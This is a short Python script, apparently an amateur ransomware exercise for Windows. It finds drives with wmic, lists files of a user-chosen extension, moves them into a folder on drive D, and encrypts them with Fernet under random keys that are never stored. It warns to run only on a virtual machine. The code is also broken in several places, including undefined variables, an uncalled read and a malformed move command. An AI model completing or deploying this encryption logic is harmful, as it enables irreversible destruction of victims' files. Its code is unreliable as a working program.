from subprocess import check_output
import platform
import time
from cryptography.fernet import Fernet


print ("Please run this code on Virtual Machine")
time.sleep(5)
y = platform.system()
x = str(input("Please enter the extension you are looking for (NO DOTS):"))


def find_drives():
    drive = ["A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "Z:", "N:"]
    sys_drive = []
    cmd = check_output("wmic logicaldisk get name", shell=True)
    for i in drive:
        if i in str(cmd):
            sys_drive.append(i)

    return sys_drive


drive = find_drives()

print(drive)


def find_files():
    for i in drive:
        cmd = check_output(str(i) + "&& dir /S *." + x, shell=True)
    return cmd
find_files()

def Text_File():
    for i in drive:
        Text = check_output(str(i)+"&& dir /s /b *."+ x+">>Your_Files.txt", shell=True)

    return Text
Text_File()



print ("This function create a folder in Drive D named Your files")
def Create_Folder():
    check_output("D: && mkdir "+"Your_files",shell = True)

Create_Folder()

def moving_files():
    Files = open("Your_Files.txt","rb")
    data = Files.read
    for i in data:
        check_output("move"+ i +"D:\\Your_files", shell = True)
    return data

moving_files()

def Encrypt_Files():
    for i in data:
        Key = Fernet.generate_key()
        New_Files = open(i+".enc","wb")
        f = Fernet(Key)
        Encrypt = f.encrypt(New_Files)
        New_Files.write(encrypt)
        New_Files.close()

Encrypt_Files()













